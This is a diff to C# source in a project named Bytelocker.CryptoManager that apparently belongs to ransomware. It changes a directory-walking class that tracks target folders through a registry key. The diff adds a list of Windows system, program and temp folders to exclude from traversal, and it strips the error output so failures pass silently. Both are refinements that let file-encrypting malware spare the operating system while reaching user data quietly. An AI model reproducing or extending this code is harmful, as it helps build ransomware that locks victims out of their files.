@@ -6,7 +6,10 @@ namespace Bytelocker.CryptoManager
 {
     class DirManager
     {
-        protected String dir_path;
+        private String dir_path;
+        public static List<String> FOLDERS_TO_EXCLUDE = new List<String>() { Environment.GetEnvironmentVariable("windir").ToLower(), Environment.GetEnvironmentVariable("ProgramData").ToLower(),
+            Environment.GetEnvironmentVariable("APPDATA").ToLower(), Environment.GetEnvironmentVariable("LOCALAPPDATA").ToLower(), (Environment.GetEnvironmentVariable("SystemDrive") + @"\Program Files").ToLower(),
+            Environment.GetEnvironmentVariable("TEMP").ToLower(), Environment.GetEnvironmentVariable("TMP").ToLower(), (Environment.GetEnvironmentVariable("SystemDrive") + @"\Program Files (x86)").ToLower()};
 
         public void ChooseDir(String dir_path)
         {
@@ -35,15 +38,12 @@ namespace Bytelocker.CryptoManager
                     }
 
                     rm.DeleteValue(RegistryManager.FOLDER_KEY_NAME, this.dir_path);
+
                 }
-                catch (System.UnauthorizedAccessException)
+                catch (Exception)
                 {
-                    Console.WriteLine("Folder is locked. Cannot decrypt!");
                 }
-                catch (Exception e)
-                {
-                    Console.WriteLine(e);
-                }
+
             }
         }
 
@@ -74,9 +74,8 @@ namespace Bytelocker.CryptoManager
                 {
                     // if folder cannot be accessed
                 }
-                catch (Exception e)
+                catch (Exception)
                 {
-                    Console.WriteLine(e);
                 }
             }
 
@@ -95,11 +94,14 @@ namespace Bytelocker.CryptoManager
 
                 try
                 {
-                    list_dirs.Add(dir);
-
-                    foreach (String sub_dir in Directory.GetDirectories(dir))
+                    if (!(FOLDERS_TO_EXCLUDE.Contains(dir.ToLower())))
                     {
-                        stack_dirs.Push(sub_dir);
+                        list_dirs.Add(dir);
+
+                        foreach (String sub_dir in Directory.GetDirectories(dir))
+                        {
+                            stack_dirs.Push(sub_dir);
+                        }
                     }
                 }
                 catch (Exception)
